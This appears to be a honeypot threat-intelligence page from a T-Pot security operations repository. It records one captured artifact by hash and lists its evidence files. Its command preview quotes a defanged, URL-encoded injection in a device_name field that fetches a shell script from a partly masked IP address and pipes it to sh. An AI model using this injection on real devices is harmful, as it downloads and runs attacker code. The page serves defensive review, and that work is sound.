# 5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
device_name=cd%20/tmp%3Bwget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20hxxp://91[.]92[.]40[.]XXX
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
